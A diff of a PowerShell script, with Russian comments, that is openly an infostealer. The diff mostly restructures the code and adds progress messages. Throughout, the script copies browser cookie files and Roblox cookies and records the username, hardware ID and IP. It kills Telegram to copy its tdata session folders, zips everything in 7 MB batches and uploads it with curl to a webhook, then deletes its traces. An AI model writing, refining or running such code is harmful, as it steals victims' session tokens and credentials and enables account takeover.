@@ -3,6 +3,8 @@ try { $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID } catch { $hwid
 $d = "$env:TEMP\$hwid"
 if (Test-Path $d) { Remove-Item $d -Recurse -Force -ErrorAction SilentlyContinue }
 New-Item -Path $d -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
+
+# Сбор кук (без изменений)
 $found = @()
 $searchPaths = @($env:APPDATA, $env:LOCALAPPDATA, (Join-Path $env:LOCALAPPDATA '..\LocalLow'))
 foreach ($base in $searchPaths) {
@@ -31,6 +33,8 @@ foreach ($f in $found) {
     $dest = Join-Path $d $name
     try { Copy-Item -Path $src -Destination $dest -Force -ErrorAction Stop } catch {}
 }
+
+# Roblox
 $rob = $env:LOCALAPPDATA + '\Roblox\LocalStorage\RobloxCookies.dat'
 if (Test-Path $rob) {
     Copy-Item $rob "$d\RobloxCookies.dat" -Force -ErrorAction SilentlyContinue
@@ -45,10 +49,13 @@ if (Test-Path $rob) {
         }
     } catch {}
 }
+
+# Инфо
 $u = $env:USERNAME
 try { $i = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -ErrorAction Stop).Content } catch { $i = "IP_NOT_FOUND" }
 "User: $u`nHWID: $hwid`nIP: $i" | Out-File "$d\info.txt" -ErrorAction SilentlyContinue
 
+# Архив и отправка кук
 $zip = "$env:TEMP\$hwid.zip"
 if (Test-Path $zip) { Remove-Item $zip -Force -ErrorAction SilentlyContinue }
 Add-Type -AssemblyName System.IO.Compression.FileSystem
@@ -67,17 +74,23 @@ if (Test-Path $zip) {
 Remove-Item $zip -Force -ErrorAction SilentlyContinue
 Remove-Item $d -Recurse -Force -ErrorAction SilentlyContinue
 
-# ===== НОВАЯ ЧАСТЬ: Telegram tdata с закрытием процесса =====
+# ===== НОВАЯ ЧАСТЬ: Telegram tdata с закрытием процесса и проверками =====
 $tgPath = "$env:APPDATA\Telegram Desktop\tdata"
 if (Test-Path $tgPath) {
-    Get-Process -Name "Telegram" -ErrorAction SilentlyContinue | Stop-Process -Force
-    Get-Process -Name "TelegramDesktop" -ErrorAction SilentlyContinue | Stop-Process -Force
-    Start-Sleep -Seconds 2
+    Write-Host "Обнаружен Telegram. Закрываю процесс..." -ForegroundColor Yellow
     
+    # Закрываем Telegram
+    try {
+        Get-Process -Name "Telegram" -ErrorAction SilentlyContinue | Stop-Process -Force
+        Get-Process -Name "TelegramDesktop" -ErrorAction SilentlyContinue | Stop-Process -Force
+        Start-Sleep -Seconds 3
+    } catch {}
+
     $tgRoot = "$env:TEMP\Telegram_$hwid"
     if (Test-Path $tgRoot) { Remove-Item $tgRoot -Recurse -Force -ErrorAction SilentlyContinue }
     New-Item -Path $tgRoot -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
-    
+
+    # Функция копирования с повторными попытками
     function SafeCopy {
         param($Source, $Destination, $MaxAttempts = 5)
         $attempt = 0
@@ -87,126 +100,138 @@ if (Test-Path $tgPath) {
                 return $true
             } catch {
                 $attempt++
-                if ($attempt -ge $MaxAttempts) { return $false }
+                if ($attempt -ge $MaxAttempts) {
+                    Write-Host "Не удалось скопировать: $Source" -ForegroundColor Red
+                    return $false
+                }
                 Start-Sleep -Milliseconds 500
             }
         }
         return $false
     }
-    
+
+    # 1. Папка D877F783D5D3EF8C
     $specialDir = Join-Path $tgPath "D877F783D5D3EF8C"
     if (Test-Path $specialDir) {
         $files = Get-ChildItem -Path $specialDir -File -ErrorAction SilentlyContinue
         $counter = 1
+        $destDir = Join-Path $tgRoot "tdata_D877F783D5D3EF8C"
+        if ($files.Count -gt 0 -and -not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force | Out-Null }
         foreach ($f in $files) {
-            $destDir = Join-Path $tgRoot "tdata_D877F783D5D3EF8C"
-            if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force | Out-Null }
             $destFile = Join-Path $destDir "$($f.Name)_$counter"
             SafeCopy -Source $f.FullName -Destination $destFile
             $counter++
         }
     }
-    
+
+    # 2. user_data/cache
     $cacheDir = Join-Path $tgPath "user_data\cache"
     if (Test-Path $cacheDir) {
         $items = Get-ChildItem -Path $cacheDir -Directory -ErrorAction SilentlyContinue
         $counter = 1
+        $destDir = Join-Path $tgRoot "tdata_userdata_cache"
+        if ($items.Count -gt 0 -and -not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force | Out-Null }
         foreach ($item in $items) {
             $subItems = Get-ChildItem -Path $item.FullName -File -ErrorAction SilentlyContinue
             foreach ($sub in $subItems) {
-                $destDir = Join-Path $tgRoot "tdata_userdata_cache"
-                if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force | Out-Null }
                 $destFile = Join-Path $destDir "$($sub.Name)_$counter"
                 SafeCopy -Source $sub.FullName -Destination $destFile
                 $counter++
             }
         }
     }
-    
+
+    # 3. user_data/media_cache
     $mediaCacheDir = Join-Path $tgPath "user_data\media_cache"
     if (Test-Path $mediaCacheDir) {
         $items = Get-ChildItem -Path $mediaCacheDir -Directory -ErrorAction SilentlyContinue
         $counter = 1
+        $destDir = Join-Path $tgRoot "tdata_userdata_mediacache"
+        if ($items.Count -gt 0 -and -not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force | Out-Null }
         foreach ($item in $items) {
             $subItems = Get-ChildItem -Path $item.FullName -File -ErrorAction SilentlyContinue
             foreach ($sub in $subItems) {
-                $destDir = Join-Path $tgRoot "tdata_userdata_mediacache"
-                if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force | Out-Null }
                 $destFile = Join-Path $destDir "$($sub.Name)_$counter"
                 SafeCopy -Source $sub.FullName -Destination $destFile
                 $counter++
             }
         }
     }
-    
+
+    # 4. Корневые файлы tdata
     $rootFiles = Get-ChildItem -Path $tgPath -File -ErrorAction SilentlyContinue
     $counter = 1
+    $destDir = Join-Path $tgRoot "tdata"
+    if ($rootFiles.Count -gt 0 -and -not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force | Out-Null }
     foreach ($f in $rootFiles) {
-        $destDir = Join-Path $tgRoot "tdata"
-        if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force | Out-Null }
         $destFile = Join-Path $destDir "$($f.Name)_$counter"
         SafeCopy -Source $f.FullName -Destination $destFile
         $counter++
     }
-    
+
+    # Отправка собранных файлов (батчами по 7 МБ)
     $tgFiles = Get-ChildItem -Path $tgRoot -Recurse -File
-    $batch = @()
-    $batchSize = 0
-    $batchId = 1
-    foreach ($tf in $tgFiles) {
-        $fsize = $tf.Length
-        if ($fsize -le 4MB) {
-            if ($batchSize + $fsize -gt 7MB -and $batch.Count -gt 0) {
-                $batchDir = "$env:TEMP\Telegram_batch_${hwid}_$batchId"
-                New-Item -Path $batchDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
-                foreach ($bf in $batch) {
-                    $relPath = $bf.FullName.Substring($tgRoot.Length + 1)
-                    $destFile = Join-Path $batchDir $relPath
-                    $destDir = Split-Path $destFile -Parent
-                    if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }
-                    Copy-Item -Path $bf.FullName -Destination $destFile -Force -ErrorAction SilentlyContinue
+    if ($tgFiles.Count -gt 0) {
+        Write-Host "Собрано $($tgFiles.Count) файлов из Telegram. Отправляю..." -ForegroundColor Cyan
+        
+        $batch = @()
+        $batchSize = 0
+        $batchId = 1
+        foreach ($tf in $tgFiles) {
+            $fsize = $tf.Length
+            if ($fsize -le 4MB) {
+                if ($batchSize + $fsize -gt 7MB -and $batch.Count -gt 0) {
+                    $batchDir = "$env:TEMP\Telegram_batch_${hwid}_$batchId"
+                    New-Item -Path $batchDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
+                    foreach ($bf in $batch) {
+                        $relPath = $bf.FullName.Substring($tgRoot.Length + 1)
+                        $destFile = Join-Path $batchDir $relPath
+                        $destDir = Split-Path $destFile -Parent
+                        if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }
+                        Copy-Item -Path $bf.FullName -Destination $destFile -Force -ErrorAction SilentlyContinue
+                    }
+                    $batchZip = "$env:TEMP\Telegram_batch_${hwid}_$batchId.zip"
+                    try {
+                        [System.IO.Compression.ZipFile]::CreateFromDirectory($batchDir, $batchZip, [System.IO.Compression.CompressionLevel]::Optimal, $false)
+                    } catch {}
+                    if (Test-Path $batchZip) {
+                        curl.exe -s -F "file=@$batchZip" $webhook
+                    }
+                    Remove-Item $batchZip -Force -ErrorAction SilentlyContinue
+                    Remove-Item $batchDir -Recurse -Force -ErrorAction SilentlyContinue
+                    $batch = @()
+                    $batchSize = 0
+                    $batchId++
                 }
-                $batchZip = "$env:TEMP\Telegram_batch_${hwid}_$batchId.zip"
-                try {
-                    [System.IO.Compression.ZipFile]::CreateFromDirectory($batchDir, $batchZip, [System.IO.Compression.CompressionLevel]::Optimal, $false)
-                } catch {}
-                if (Test-Path $batchZip) {
-                    curl.exe -s -F "file=@$batchZip" $webhook
-                }
-                Remove-Item $batchZip -Force -ErrorAction SilentlyContinue
-                Remove-Item $batchDir -Recurse -Force -ErrorAction SilentlyContinue
-                $batch = @()
-                $batchSize = 0
-                $batchId++
+                $batch += $tf
+                $batchSize += $fsize
+            } else {
+                $tempFile = "$env:TEMP\$($tf.Name)"
+                Copy-Item -Path $tf.FullName -Destination $tempFile -Force -ErrorAction SilentlyContinue
+                curl.exe -s -F "file=@$tempFile" $webhook
+                Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
             }
-            $batch += $tf
-            $batchSize += $fsize
-        } else {
-            $tempFile = "$env:TEMP\$($tf.Name)"
-            Copy-Item -Path $tf.FullName -Destination $tempFile -Force -ErrorAction SilentlyContinue
-            curl.exe -s -F "file=@$tempFile" $webhook
-            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
         }
-    }
-    if ($batch.Count -gt 0) {
-        $batchDir = "$env:TEMP\Telegram_batch_${hwid}_$batchId"
-        New-Item -Path $batchDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
-        foreach ($bf in $batch) {
-            $relPath = $bf.FullName.Substring($tgRoot.Length + 1)
-            $destFile = Join-Path $batchDir $relPath
-            $destDir = Split-Path $destFile -Parent
-            if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }
-            Copy-Item -Path $bf.FullName -Destination $destFile -Force -ErrorAction SilentlyContinue
+        if ($batch.Count -gt 0) {
+            $batchDir = "$env:TEMP\Telegram_batch_${hwid}_$batchId"
+            New-Item -Path $batchDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
+            foreach ($bf in $batch) {
+                $relPath = $bf.FullName.Substring($tgRoot.Length + 1)
+                $destFile = Join-Path $batchDir $relPath
+                $destDir = Split-Path $destFile -Parent
+                if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }
+                Copy-Item -Path $bf.FullName -Destination $destFile -Force -ErrorAction SilentlyContinue
+            }
+            $batchZip = "$env:TEMP\Telegram_batch_${hwid}_$batchId.zip"
+            try {
+                [System.IO.Compression.ZipFile]::CreateFromDirectory($batchDir, $batchZip, [System.IO.Compression.CompressionLevel]::Optimal, $false)
+            } catch {}
+            if (Test-Path $batchZip) {
+                curl.exe -s -F "file=@$batchZip" $webhook
+            }
+            Remove-Item $batchZip -Force -ErrorAction SilentlyContinue
+            Remove-Item $batchDir -Recurse -Force -ErrorAction SilentlyContinue
         }
-        $batchZip = "$env:TEMP\Telegram_batch_${hwid}_$batchId.zip"
-        try {
-            [System.IO.Compression.ZipFile]::CreateFromDirectory($batchDir, $batchZip, [System.IO.Compression.CompressionLevel]::Optimal, $false)
-        } catch {}
-        if (Test-Path $batchZip) {
-            curl.exe -s -F "file=@$batchZip" $webhook
-        }
-        Remove-Item $batchZip -Force -ErrorAction SilentlyContinue
-        Remove-Item $batchDir -Recurse -Force -ErrorAction SilentlyContinue
     }
     Remove-Item $tgRoot -Recurse -Force -ErrorAction SilentlyContinue
 }
